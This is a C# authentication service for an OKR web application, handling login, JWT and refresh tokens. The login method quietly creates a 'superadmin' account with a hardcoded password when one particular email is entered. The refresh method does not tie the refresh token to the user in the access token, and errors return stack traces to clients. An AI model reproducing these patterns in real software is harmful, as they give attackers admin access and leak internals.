using MayNghien.Models.Response.Base;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Identity;
using Microsoft.Extensions.Configuration;
using Microsoft.IdentityModel.Tokens;
using OKR.DTO;
using OKR.DTO.Auth;
using OKR.Models;
using OKR.Models.Entity;
using OKR.Repository.Contract;
using OKR.Service.Contract;
using Serilog;
using System.IdentityModel.Tokens.Jwt;
using System.Security.Claims;
using System.Security.Cryptography;
using System.Text;
using static MayNghien.Infrastructure.CommonMessage.AuthResponseMessage;

namespace OKR.Service.Implementation
{
    public class AuthencationService : IAuthencationService
    {
        private IConfiguration _config;
        private readonly UserManager<ApplicationUser> _userManager;
        private readonly RoleManager<IdentityRole> _roleManager;
        private IHttpContextAccessor _httpContextAccessor;
        private IRefreshTokenModelRepository _refreshTokenModelRepository;


        public AuthencationService(IConfiguration config, UserManager<ApplicationUser> userManager,
             RoleManager<IdentityRole> roleManager, IHttpContextAccessor httpContextAccessor, IRefreshTokenModelRepository refreshTokenModelRepository)
        {
            _config = config;
            _userManager = userManager;
            _roleManager = roleManager;
            _httpContextAccessor = httpContextAccessor;
            _refreshTokenModelRepository = refreshTokenModelRepository;
        }
        public async Task<AppResponse<LoginResult>> AuthencationUser(UserDto login)
        {
            var result = new AppResponse<LoginResult>();
            try
            {
                UserDto user = null;
                ApplicationUser identityUser = new ApplicationUser();
                var loginResult = new LoginResult();
                //Validate the User Credentials    
                //Demo Purpose, I have Passed HardCoded User Information    

                identityUser = await _userManager.FindByNameAsync(login.UserName);
                if (identityUser != null)
                {
                    if (await _userManager.CheckPasswordAsync(identityUser, login.Password))
                    {
                        user = new UserDto { UserName = identityUser.UserName, Email = identityUser.Email };
                    }

                }
                else if (login.UserName == "karzix1809@gmail.com")
                {
                    var newIdentity = new ApplicationUser { UserName = login.UserName, Email = login.Email, EmailConfirmed = true };
                    await _userManager.CreateAsync(newIdentity);
                    await _userManager.AddPasswordAsync(newIdentity, "CdzuOsSbBH");
                    if (!(await _roleManager.RoleExistsAsync("superadmin")))
                    {
                        IdentityRole role = new IdentityRole { Name = "superadmin" };
                        await _roleManager.CreateAsync(role);
                    }
                    await _userManager.AddToRoleAsync(newIdentity, "superadmin");
                }
                if (user != null)
                {
                    var claims = await GetClaims(user, identityUser);
                    var tokenString = GenerateAccessToken(claims);
                    loginResult.Token = tokenString;
                    loginResult.UserName = user.UserName;
                    loginResult.RefreshToken = GenerateRefreshToken();
                    var roles = await _userManager.GetRolesAsync(identityUser);
                    loginResult.Roles = roles.ToList();

                    var curRefeshToken = _refreshTokenModelRepository.FindBy(x=>x.UserName ==  login.UserName).FirstOrDefault();
                    if (curRefeshToken != null)
                    {
                        curRefeshToken.RefreshToken = loginResult.RefreshToken;
                        curRefeshToken.RefreshTokenExpiryTime = DateTime.UtcNow.AddHours(18);
                        _refreshTokenModelRepository.Edit(curRefeshToken);
                    }
                    else
                    {
                        RefreshTokenModel refeshToken = new RefreshTokenModel
                        {
                            RefreshToken = loginResult.RefreshToken,
                            RefreshTokenExpiryTime = DateTime.UtcNow.AddHours(18),
                            Id = Guid.NewGuid(),
                            UserName = user.UserName,
                        };
                        _refreshTokenModelRepository.Add(refeshToken);
                    }
                    
                    return result.BuildResult(loginResult);
                }
                else
                {
                    return result.BuildError(ERR_MSG_UserNotFound);
                }
            }
            catch (Exception ex)
            {

                return result.BuildError(ex.ToString());
            }
        }
        //private async Task<string> GenerateJSONWebToken(UserDto userInfo, ApplicationUser identityUser)
        //{
        //    var securityKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(_config["Jwt:Key"]));
        //    var credentials = new SigningCredentials(securityKey, SecurityAlgorithms.HmacSha256);

        //    var token = new JwtSecurityToken(_config["Jwt:Issuer"],
        //      _config["Jwt:Issuer"],
        //      claims: await GetClaims(userInfo, identityUser),
        //      expires: DateTime.Now.AddHours(1),
        //      signingCredentials: credentials);

        //    return new JwtSecurityTokenHandler().WriteToken(token);
        //}
        private async Task<List<Claim>> GetClaims(UserDto user, ApplicationUser identityUser)
        {
         
            var claims = new List<Claim>
            {
                new Claim("UserName", user.UserName),

                new Claim("Email", user.Email),
           
            };
            var roles = await _userManager.GetRolesAsync(identityUser);
            foreach (var role in roles)
            {
                claims.Add(new Claim("Roles", role));
            }
            foreach (var role in roles)
            {
                claims.Add(new Claim(ClaimTypes.Role, role));
            }
            return claims;

        }
        private string GenerateRefreshToken()
        {
            var randomNumber = new byte[32];
            using (var rng = RandomNumberGenerator.Create())
            {
                rng.GetBytes(randomNumber);
                return Convert.ToBase64String(randomNumber);
            }
        }
        private ClaimsPrincipal GetPrincipalFromExpiredToken(string token)
        {
            var tokenValidationParameters = new TokenValidationParameters
            {
                ValidateAudience = false, //you might want to validate the audience and issuer depending on your use case
                ValidateIssuer = false,
                ValidateIssuerSigningKey = true,
                IssuerSigningKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(_config["Jwt:Key"])),
                ValidateLifetime = false //here we are saying that we don't care about the token's expiration date
            };
            var tokenHandler = new JwtSecurityTokenHandler();
            SecurityToken securityToken;
            var principal = tokenHandler.ValidateToken(token, tokenValidationParameters, out securityToken);
            var jwtSecurityToken = securityToken as JwtSecurityToken;
            if (jwtSecurityToken == null || !jwtSecurityToken.Header.Alg.Equals(SecurityAlgorithms.HmacSha256, StringComparison.InvariantCultureIgnoreCase))
                throw new SecurityTokenException("Invalid token");
            return principal;
        }
        private string GenerateAccessToken(IEnumerable<Claim> claims)
        {
            var securityKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(_config["Jwt:Key"]));
            var credentials = new SigningCredentials(securityKey, SecurityAlgorithms.HmacSha256);

            var token = new JwtSecurityToken(_config["Jwt:Issuer"],
              _config["Jwt:Issuer"],
              claims: claims,
              expires: DateTime.UtcNow.AddHours(1),
              signingCredentials: credentials);
            var tokenString = new JwtSecurityTokenHandler().WriteToken(token);
            return tokenString;
        }
        public AppResponse<LoginResult> Refresh(UserDto request)
        {
            var result = new AppResponse<LoginResult>();
            try
            {
                string accessToken = request.Token;
                string refreshToken = request.RefreshToken;

                var refeshToken = _refreshTokenModelRepository.FindByPredicate(x => x.RefreshToken == refreshToken).FirstOrDefault();
                if (refeshToken is null || refeshToken.RefreshTokenExpiryTime < DateTime.UtcNow) 
                {
                    return result.BuildError("Invalid client request");
                }
                var principal = GetPrincipalFromExpiredToken(accessToken);
                var newAccessToken = GenerateAccessToken(principal.Claims);
                var newRefreshToken = GenerateRefreshToken();

                refeshToken.RefreshTokenExpiryTime = DateTime.UtcNow.AddHours(18);
                refeshToken.RefreshToken = newRefreshToken;
                _refreshTokenModelRepository.Edit(refeshToken);

                var rs = new LoginResult();
                rs.RefreshToken = newRefreshToken;
                rs.Token = newAccessToken;
                result.BuildResult(rs);
            }
            catch (Exception ex)
            {
                return result.BuildError(ex.Message+ " " + ex.StackTrace);
            }
            return result;
        }

        public async Task<AppResponse<UserDto>> GetInforAccount()
        {
            var result = new AppResponse<UserDto>();
            try
            {
                var user = await _userManager.FindByNameAsync(_httpContextAccessor.HttpContext.User.Identity.Name);
                var roles = await _userManager.GetRolesAsync(user);
                var userDto = new UserDto
                {
                    UserName = user.UserName,
                    Roles = roles.ToArray(),
                    Email = user.Email
                };
                Log.Information(user.UserName + " login");
                result.BuildResult(userDto);
            }
            catch (Exception ex)
            {
                return result.BuildError(ex.Message + " " + ex.StackTrace);
            }
            return result;
        }
    }
}
